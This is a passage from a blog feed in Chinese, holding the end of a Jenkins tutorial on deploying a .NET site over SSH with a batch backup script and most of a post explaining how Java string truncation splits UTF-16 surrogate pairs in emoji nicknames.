&lt;p class=&quot;my_title&quot;&gt;完美的构建后操作&lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt; &lt;/p&gt;
&lt;p&gt;       构建完成，接下来就是把文件上传到目标服务器了。这就是要用到我们前面配置的  Publish Over SSH插件了。 添加构建后步骤，选择Send build artifacts over SSH。并添加第一步中创建的 应用服务器。多个服务器，可以添加多个server。要传输的文件为构建步骤中生成的文件 deploy.zip，上传后要执行的命令为：cmd.exe /c &quot;d: &amp;amp;&amp;amp; cd wwwroot &amp;amp;&amp;amp; backup.bat&quot;  中  backup.bat 完成文件备份以当前时间生成备份文件放到 backup文件夹中。文件内容如下；&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
set vardate=%&lt;span&gt;date&lt;/span&gt;:~&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;4&lt;/span&gt;%%&lt;span&gt;date&lt;/span&gt;:~&lt;span&gt;5&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;%%&lt;span&gt;date&lt;/span&gt;:~&lt;span&gt;8&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;%&lt;span&gt;
set h&lt;/span&gt;=%&lt;span&gt;time&lt;/span&gt;:~&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;%&lt;br/&gt;# 格式化小时，如果小时10，补0，不然会有空格&lt;br/&gt;&lt;span&gt;
set h&lt;/span&gt;=%h: =&lt;span&gt;0&lt;/span&gt;%&lt;span&gt;
set otime&lt;/span&gt;=%h%%&lt;span&gt;time&lt;/span&gt;:~&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;%%&lt;span&gt;time&lt;/span&gt;:~&lt;span&gt;6&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;%&lt;br/&gt;# 备份文件格式 YYYYMMddHHmmss.zip&lt;br/&gt;&lt;span&gt;
set filename&lt;/span&gt;=%vardate%%otime%.&lt;span&gt;zip&lt;/span&gt;&lt;span&gt;
# 备份原文件
7z a &lt;/span&gt;%filename% .\gyapp\* -x!deploy.&lt;span&gt;zip&lt;/span&gt; -xr!upload -xr!&lt;span&gt;logs
# 移动文件到backup 文件夹
move &lt;/span&gt;%filename%&lt;span&gt; .\Backup 
# 解压文件
7z x deploy.&lt;/span&gt;&lt;span&gt;zip&lt;/span&gt; -aoa -o&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;D:\wwwroot\gyapp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;　&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008212627723-1342602189.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;　　最后来一张构建成功的截图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008215024067-1957433508.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;








&lt;p&gt;&lt;em&gt; 　　&lt;/em&gt;到这里所有配置就完成了，如果顺利的话，自动化部署就完成了。鉴于本人能力问题，自到第79次构建，才真正愉快的左打收工了。没错，是79次！&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202010/88102-20201008213857089-2130439264.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;




&lt;p&gt; &lt;span&gt;  &lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt;04&lt;/p&gt;
&lt;p class=&quot;my_title&quot;&gt;结语&lt;/p&gt;
&lt;p&gt;         文章到这里，我只想说，这个过程真的不怎么愉悦。整个过程需要用到方方面面的知识，比如构建过程，环境变量配置，编写bat文件等 。也有很多异常问题，比如sshkey 版本问题，bat中时间格式问题等等。也要用到一些工具软件，比如7Z，FreeSSHD，jenkins。再者也有很多细节要考虑，比如备份文件，排除文件等。再有前面说的，百度一下，一搜打把的文章，大部分并无太多用处，很多都只是demo。比如，大部分都有说所到用ftp，但是无法支持子目录传输。以上种种问题，多次要奔溃放弃，怎奈受人之托，忠人之事，还好媳妇一直鼓励，并带着大宝小宝玩耍。最后断断续续用了几天时间，整体来说还是痛苦并快乐着。想着过程中那么问题，就想着整理成文，希望有需要的人看到本文，真的可以半天搞定。&lt;/p&gt;


&lt;p&gt;         I have a dream to be a good programmer。&lt;/p&gt;
&lt;p&gt;         &lt;img src=&quot;https://img2020.cnblogs.com/blog/88102/202004/88102-20200429125523007-1330403336.png&quot; alt=&quot;&quot; width=&quot;424&quot; height=&quot;224&quot;/&gt;&lt;/p&gt;


&lt;/div&gt;</description>
<pubDate>Thu, 08 Oct 2020 23:59:00 +0000</pubDate>
<dc:creator>2J</dc:creator>
<og:description>又到一年国庆，终于有了难得的几天空闲，计划陪陪媳妇娃子，再把最近阅读的几本相关书总结梳理下。当然，计划总是美好的，于时接到了一个老朋友电话。大意是他搞了一个.net小网站，部署了4个节点，每次更新程序</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jijunjian/p/13781048.html</dc:identifier>
</item>
<item>
<title>【原创】经验分享：一个小小emoji尽然牵扯出来这么多东西？ - 一枝花算不算浪漫</title>
<link>http://www.cnblogs.com/wang-meng/p/13783563.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wang-meng/p/13783563.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;之前也分享过很多工作中踩坑的经验：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/wang-meng/p/13176345.html&quot;&gt;一个线上问题的思考：Eureka注册中心集群如何实现客户端请求负载及故障转移？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/wang-meng/p/13630260.html&quot;&gt;【原创】经验分享：一个Content-Length引发的血案(almost....)&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;今天再来分享工作中一个真实的案例：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;商品评价列表页，显示每条用户的评价详情，为了保护用户隐私，要求显示用户昵称时只能显示第一位和最后一位，其他的用※代替。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如输入：🐳🐳🐠，输出：🐳***🐠&lt;/p&gt;
&lt;p&gt;看似一个平淡无奇的需求，我也没有太在意。服务端将用户的评论信息存储到&lt;code&gt;db&lt;/code&gt;中，评价列表接口就是将数据库中该商品的评论信息展示出来，特殊处理下评论人的昵称就可以了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但是！！&lt;/strong&gt; 测试同学发现用户昵称包含&lt;code&gt;emoji表情&lt;/code&gt;时就会出问题，切割的数据会有&lt;strong&gt;问号显示！！&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;模拟的示例代码如下：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e101226841d146b3a6c76de1852f1f54~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;字符串截取.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1cc9ead8b5c54b539be865f769fe9b85~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;输出.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看到这个输出，我真的是一脸懵逼，这完全不是我想要的结果呀！！！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/40e9d62aee224536befb359a09283761~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;黑人问号.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这三个鱼可算是难倒我了，难道只能给测试说 &lt;strong&gt;emoji太特殊&lt;/strong&gt; 不予处理？然后&lt;strong&gt;撒个娇&lt;/strong&gt;蒙混过关？&lt;/p&gt;
&lt;p&gt;思考了良久，我还是决定要正视这个问题并解决掉它！&lt;strong&gt;(毕竟我还是那个不畏困难的小机灵鬼🤔)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c5c822edddc343e0a57c1a739c40a8de~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;问题不大.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PS：本文很大程度是受到之前公司一位同事unicode分享的启发，在这里向我的这位老师致敬！下面的内容会一步步分析这个问题的产生以及最终的解决方案。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;概念常识&quot;&gt;概念常识&lt;/h2&gt;
&lt;p&gt;要解决这些问题，就必须要铺垫一些基础知识，大家等不及看解决方案 可以拉到文章最后的代码示例。&lt;/p&gt;
&lt;h3 id=&quot;utf8mb4&quot;&gt;utf8mb4&lt;/h3&gt;
&lt;p&gt;一般我们在数据库创建表时都会默认使用这种编码格式：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9fe8a84b64d6432e9d5cf1729572d2c6~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;utf8mb4编码.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;相信大家对这个编码格式都不陌生吧，当我们想存储&lt;code&gt;emoji&lt;/code&gt;数据到数据库中，那么数据库的格式就需要指定为&lt;code&gt;utf8mb4&lt;/code&gt;了，要不然存储就会报错了。所以在很多公司的&lt;code&gt;db规范&lt;/code&gt;中，数据库默认编码必须为&lt;code&gt;utf8mb4&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e27806cff7274b568fec2d06727dec18~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;emoji保存报错.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但是大家有没有过这样的疑惑，为何&lt;code&gt;utf8&lt;/code&gt;不行而&lt;code&gt;utf8mb4&lt;/code&gt;就行？这里面到底有什么&lt;strong&gt;弯弯道道&lt;/strong&gt;？&lt;/p&gt;
&lt;p&gt;这里面涉及到&lt;code&gt;unicode&lt;/code&gt;相关知识，我们下面会提到，大家继续看。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;mysql 5.5&lt;/code&gt; 之前，&lt;code&gt;utf8&lt;/code&gt;编码只支持&lt;code&gt;1-3&lt;/code&gt;个字节，从&lt;code&gt;mysql 5.5&lt;/code&gt;开始，可支持4个字节&lt;code&gt;UTF&lt;/code&gt;编码&lt;code&gt;utf8mb4&lt;/code&gt;，一个字符最多能有&lt;strong&gt;4字节&lt;/strong&gt;，所以能支持更多的字符集。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a3cdf74605d94187bf950b0dc1457c21~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;emoji长度.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个表格中包含了所有的 &lt;code&gt;emoji&lt;/code&gt; 以及它所对应的 &lt;code&gt;unicode&lt;/code&gt;编码，同时也有对应的 &lt;code&gt;utf-8&lt;/code&gt;编码的实现。&lt;/p&gt;
&lt;p&gt;从图中也可以看出 &lt;code&gt;emoji&lt;/code&gt; 表情用 &lt;code&gt;utf-8&lt;/code&gt; 表示时会占用 &lt;strong&gt;4个字节&lt;/strong&gt;，这也就是为什么数据库用&lt;code&gt;utf8&lt;/code&gt;无法存储&lt;code&gt;emoji&lt;/code&gt;表情的原因了。&lt;/p&gt;
&lt;p&gt;同样我们也可以在&lt;code&gt;java&lt;/code&gt;代码中看看&lt;code&gt;emoji&lt;/code&gt;占用几个字节长度：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fa3d83a05dbb4744b22f22730edc026e~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;emoji长度.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们也可以看到&lt;code&gt;String.getBytes()&lt;/code&gt;，默认是&lt;code&gt;utf-8&lt;/code&gt;编码的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/09a70b0d6f3f4dcc937235452fee2484~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;String.getBytes编码格式.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;ascii码&quot;&gt;ASCII码&lt;/h2&gt;
&lt;p&gt;上面介绍&lt;code&gt;utf8mb4&lt;/code&gt;时有提过&lt;code&gt;unicode&lt;/code&gt;，介绍它之前我们也需要先提一嘴我们的老朋友：&lt;code&gt;ASCII&lt;/code&gt;码&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;ASCII（American Standard Code for Information Interchange，美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统。它主要用于显示现代英语。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这样我们就可以使用一个字节来表示现代英文，看起来非常不错，部分数据对应关系如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d85e192d3f83429db8bf4021ce483bb6~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;ASCII码.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;但这个只能显示的代表拉丁文，这显然是远远不够的。&lt;/p&gt;
&lt;h2 id=&quot;unicode&quot;&gt;Unicode&lt;/h2&gt;
&lt;p&gt;显而易见，计算机的发展并不是只支持英文一种语言的，&lt;code&gt;ASCII&lt;/code&gt;的局限在于只能显示&lt;code&gt;26个&lt;/code&gt;基本拉丁字母、阿拉伯数字和英式标点符号，因此只能用于显示现代美国英语。&lt;/p&gt;
&lt;p&gt;这时如果能有一种包含了世界上所有的文字的字符集，每一个地区的文字都在这个字符集中有唯一的二进制表示，这样便不会出现乱码问题了。所以&lt;code&gt;Unicode&lt;/code&gt;也应运而生了。&lt;/p&gt;
&lt;h3 id=&quot;概念&quot;&gt;概念&lt;/h3&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;Unicode，中文又称万国码、国际码、统一码、单一码，是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;平面&quot;&gt;平面&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Unicode&lt;/code&gt; 首先承认了 &lt;code&gt;ASCII&lt;/code&gt; 占用 &lt;strong&gt;0-127&lt;/strong&gt; 整数资源的合法性，之后又一次占用了 &lt;code&gt;128-65535&lt;/code&gt; 的整数资源，有了这么多的整数资源，我们就可以把世界各种文字的每一种字符分配一个整数来表示了。&lt;/p&gt;
&lt;p&gt;之后，&lt;code&gt;Unicode&lt;/code&gt; 联盟发现 &lt;strong&gt;65536&lt;/strong&gt; 个整数也不够分配的，于是就索性一次性又把之后的 &lt;strong&gt;16 个 65536&lt;/strong&gt; 的数字即 &lt;strong&gt;65536-1114111&lt;/strong&gt; 的整数资源给占了，然后把多占的 &lt;strong&gt;16 个 65536&lt;/strong&gt; 的段分别命名为 &lt;strong&gt;16 个平面&lt;/strong&gt;，加上原来的 &lt;strong&gt;0-65535 平面&lt;/strong&gt;，&lt;code&gt;Unicode&lt;/code&gt; 总共有 &lt;strong&gt;17 个平面&lt;/strong&gt;。比如第 1 平面就是 &lt;strong&gt;65536-131072&lt;/strong&gt;。当然，到目前为止，还只分配了 &lt;strong&gt;7 个平面&lt;/strong&gt;出去。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/091c2312e83a487b9aedcdcc9135b43f~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;Unicode平面.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第0平面（Plane 0）&lt;/strong&gt;，是&lt;code&gt;Unicode&lt;/code&gt;中的一个编码区段。编码从&lt;code&gt;U+0000&lt;/code&gt;至&lt;code&gt;U+FFFF&lt;/code&gt;，这个平面里面的字符是我们最常用到的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;65535&lt;/strong&gt; 之后分配的字符大多数是 &lt;code&gt;emoji&lt;/code&gt; 表情，比如 😺 是 &lt;strong&gt;128570（\uD83D\uDE3A）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里推荐一个在线的编码转换网站：&lt;strong&gt;&lt;a href=&quot;http://ctf.ssleye.com/cencode.html&quot;&gt;http://ctf.ssleye.com/cencode.html&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/76274d484a2f43a6bec5a1cf28627be8~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;在线utf16转换.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;表示范围&quot;&gt;表示范围&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Unicode&lt;/code&gt;表示范围：&lt;code&gt;U+0000 ~ U+10FFFF&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;也就大概是：U+0000~U+110000(加上1)，也就是17个FFFF（65535）&lt;/li&gt;
&lt;li&gt;差不多17*6w，大概有100w个码点可以用来映射字符&lt;/li&gt;
&lt;li&gt;准确的值是 1114,112，差不多112w个码点&lt;/li&gt;
&lt;li&gt;最新版本的Unicode含有136,690 个字符，离100w还很远。&lt;/li&gt;
&lt;li&gt;Unicode 官方表示目前的码点已经够用，以后不再扩充&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;实现方式&quot;&gt;实现方式&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Unicode&lt;/code&gt;的实现方式不同于编码方式。一个字符的&lt;code&gt;Unicode&lt;/code&gt;编码是确定的。但是在实际传输过程中，由于不同系统平台的设计不一定一致，以及出于节省空间的目的，对&lt;code&gt;Unicode&lt;/code&gt;编码的实现方式有所不同。&lt;code&gt;Unicode&lt;/code&gt;的实现方式称为&lt;code&gt;Unicode&lt;/code&gt;转换格式（Unicode Transformation Format，简称为UTF）。&lt;/p&gt;
&lt;p&gt;对于被&lt;code&gt;Unicode&lt;/code&gt;收录的字符其编码是唯一且确定的。但是&lt;code&gt;Unicode&lt;/code&gt;的实现方式(出于传输、存储、处理或向后兼容的考虑)却有不同的几种，其中最流行的是&lt;code&gt;UTF-8&lt;/code&gt;、&lt;code&gt;UTF-16&lt;/code&gt;、&lt;code&gt;UCS2&lt;/code&gt;、&lt;code&gt;UCS4/UTF-32&lt;/code&gt;等，细分的话还有&lt;strong&gt;大小端&lt;/strong&gt;的区别。&lt;/p&gt;
&lt;p&gt;对于我们&lt;code&gt;Java&lt;/code&gt;而言，可以从&lt;code&gt;char&lt;/code&gt;占用&lt;strong&gt;2字节&lt;/strong&gt;来推断出使用的是&lt;code&gt;UTF-16&lt;/code&gt;编码来存储&lt;/p&gt;
&lt;p&gt;对于各种编码问题推荐一篇好文：&lt;a href=&quot;https://developer.ibm.com/zh/articles/j-lo-chinesecoding/&quot;&gt;深入分析 Java 中的中文编码问题&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;判断是否包含中文&quot;&gt;判断是否包含中文&lt;/h2&gt;
&lt;p&gt;上面大概了解了&lt;code&gt;Unicode&lt;/code&gt;的含义及用途，&lt;strong&gt;那么了解这个玩意有什么实际作用呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们再来看一个小的需求，比如：&lt;strong&gt;如何判断一个字符串中包含中文？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;相信大家也遇到过这种需求吧，一般我们都会去百度一通，一定都能找到一个判断是否包含中文的正则表达式，然后满心欢喜解决了问题。&lt;/p&gt;
&lt;p&gt;恰巧我们系统中也有这么一个正则判断，是架构组的同事封装好的，一起来看下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/280630c3b2864389a34b7c37f32af1ed~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;是否含有中文.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;显然，这里是通过&lt;code&gt;Unicode&lt;/code&gt;区间去判断的，有没有问题呢？&lt;/p&gt;
&lt;p&gt;这里的区间是用的&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%97%A5%E9%9F%93%E7%B5%B1%E4%B8%80%E8%A1%A8%E6%84%8F%E6%96%87%E5%AD%97#cite_note-8&quot;&gt;中日韩统一表意文字&lt;/a&gt;，但是这个是1993年的版本，包含了大部分我们常用的中文，共有&lt;strong&gt;20902&lt;/strong&gt;个字，看到后面补充的版本，还添加了很多字，由此可想像我们现在使用的判断方式肯定会漏掉后添加的字：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bf23aef8fdc548e388174fd0376afcbf~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;中日韩统一表意文字.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们用2000年增加的&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E4%B8%AD%E6%97%A5%E9%9F%93%E7%B5%B1%E4%B8%80%E8%A1%A8%E6%84%8F%E6%96%87%E5%AD%97%E6%93%B4%E5%B1%95%E5%8D%80A&quot;&gt;中日韩统一表意文字扩展区A&lt;/a&gt; 来举例测试一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6e28259fe3a0483fb4119dfd1a0e4987~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;中日韩统一表意文字扩展区A.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里加了很多生僻字，甚至都没有我认识的，我们用第二排的数据来做一个验证：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/41d820cd225c4e9ab3579e8841076495~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;验证是否包含中文.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看到这里是不是很惊讶？并高呼你们这里写了一个&lt;code&gt;bug&lt;/code&gt;，哈哈。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2ad2f0e9903347d9870fc1caa02cefa7~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;写Bug.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其实这里并不能说我们的正则判断有&lt;code&gt;bug&lt;/code&gt;，这个需要看我们的需求是否精准到所有的生僻词都得识别到。根据用户的使用习惯，输入这些生僻字的概率不是很高，所以这个正则并没有小伙伴反馈有问题。&lt;/p&gt;
&lt;h2 id=&quot;解决emoji截取的问题&quot;&gt;解决emoji截取的问题&lt;/h2&gt;
&lt;p&gt;言归正传，我们终究还是要解决开头提出的问题，如何正确的截取含有&lt;code&gt;emoji&lt;/code&gt;的字符串？这里从&lt;code&gt;UTF-16&lt;/code&gt;编码开始说起。&lt;/p&gt;
&lt;h3 id=&quot;utf-16&quot;&gt;UTF-16&lt;/h3&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;UTF-16 具体定义了 Unicode 字符在计算机中存取方法。UTF-16 用两个字节来表示 Unicode 转化格式，这个是定长的表示方法，不论什么字符都可以用两个字节表示，两个字节是 16 个 bit，所以叫 UTF-16。UTF-16 表示字符非常方便，每两个字节表示一个字符，这个在字符串操作时就大大简化了操作，这也是 Java 以 UTF-16 作为内存的字符存储格式的一个很重要的原因。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在基本多语言平面（码位范围U+0000-U+FFFF）内的码位&lt;code&gt;UTF-16&lt;/code&gt;编码使用1个码元且其值与&lt;code&gt;Unicode&lt;/code&gt;是相等的（不需要转换），这个就是我们正常的汉字，比如在辅助平面（码位范围U+10000-U+10FFFF）内的码位在&lt;code&gt;UTF-16&lt;/code&gt;中被编码为一对&lt;code&gt;16bit&lt;/code&gt;的码元（即32bit,4字节），称作&lt;strong&gt;代理对(surrogate pair)&lt;/strong&gt;。组成代理对的两个码元前一个称为 &lt;strong&gt;前导代理(lead surrogates)&lt;/strong&gt; 范围为&lt;code&gt;0xD800-0xDBFF&lt;/code&gt;，后一个称为 &lt;strong&gt;后尾代理(trail surrogates)&lt;/strong&gt; 范围为&lt;code&gt;0xDC00-0xDFFF&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;surrogate&quot;&gt;surrogate&lt;/h3&gt;
&lt;p&gt;上面有提到&lt;code&gt;surrogate&lt;/code&gt;，&lt;code&gt;surrogate&lt;/code&gt;是代理的意思， 这个概念不是来自 &lt;code&gt;Java&lt;/code&gt; 语言，而是来自 &lt;code&gt;Unicode&lt;/code&gt; 编码方式之一 &lt;code&gt;UTF-16&lt;/code&gt;。具体请见：&lt;a href=&quot;https://zh.wikipedia.org/wiki/UTF-16&quot;&gt;UTF-16&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简而言之，&lt;code&gt;Java&lt;/code&gt; 语言内部的字符信息是使用 &lt;code&gt;UTF-16&lt;/code&gt; 编码。因为&lt;code&gt;char&lt;/code&gt; 这个类型是 &lt;code&gt;16-bit&lt;/code&gt; 的。它可以有&lt;code&gt;65536&lt;/code&gt;种取值，即&lt;code&gt;65536&lt;/code&gt;个编号，每个编号可以代表1种字符。但是，&lt;code&gt;Unicode&lt;/code&gt; 包含的字符已经远远超过&lt;code&gt;65536&lt;/code&gt;个。那么编号大于&lt;code&gt;65536&lt;/code&gt;的，还要用 &lt;code&gt;16-bit&lt;/code&gt; 编码，该怎么办？于是&lt;code&gt;Unicode&lt;/code&gt; 标准制定组想出的办法就是，从这&lt;code&gt;65536&lt;/code&gt;个编号里，拿出&lt;code&gt;2048&lt;/code&gt;个，规定它们是&lt;code&gt;「Surrogates」&lt;/code&gt;，让它们两个为一组，来代表编号大于&lt;code&gt;65536&lt;/code&gt;的那些字符。&lt;/p&gt;
&lt;p&gt;更具体地，编号为 &lt;code&gt;U+D800&lt;/code&gt; 至 &lt;code&gt;U+DBFF&lt;/code&gt; 的规定为&lt;code&gt;「High Surrogates」&lt;/code&gt;，共&lt;code&gt;1024&lt;/code&gt;个。编号为 &lt;code&gt;U+DC00&lt;/code&gt; 至 &lt;code&gt;U+DFFF&lt;/code&gt; 的规定为&lt;code&gt;「Low Surrogates」&lt;/code&gt;，也是&lt;code&gt;1024&lt;/code&gt;个。它们两两组合出现，就又可以多表示&lt;code&gt;1048576&lt;/code&gt;种字符。&lt;/p&gt;
&lt;h3 id=&quot;emoji截取异常原因&quot;&gt;emoji截取异常原因&lt;/h3&gt;
&lt;p&gt;上面都是一些概念性的知识，如果硬看确实容易懵，我们还是回过头看一下吧，从代码入手：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/454a5616c5b64a8894d015aeb1bc5f17~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;昵称.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以把&lt;code&gt;emoji&lt;/code&gt;分离出来，如下：&lt;/p&gt;
&lt;p&gt;🐳 -&amp;gt; &lt;strong&gt;\uD83D\uDC33&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;🐳 -&amp;gt; &lt;strong&gt;\uD83D\uDC33&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;🐠 -&amp;gt; &lt;strong&gt;\uD83D\uDC20&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;emoji&lt;/code&gt;肯定是大于&lt;code&gt;65536&lt;/code&gt;的，所以这里就用&lt;code&gt;「High Surrogates」&lt;/code&gt;和&lt;code&gt;「Low Surrogates」&lt;/code&gt;两两组合的方式来呈现的。&lt;/p&gt;
&lt;p&gt;由上面的&lt;code&gt;UTF-16&lt;/code&gt;编码知识可以推断出，我们的&lt;code&gt;emoji&lt;/code&gt;表情截取一个&lt;code&gt;char&lt;/code&gt;后出现乱码的原因，是因为它是属于&lt;code&gt;UTF-16&lt;/code&gt;编码辅助平面内的代理对，而我们如果截取时将代理对拆分开 就会出现异常的问题。&lt;/p&gt;
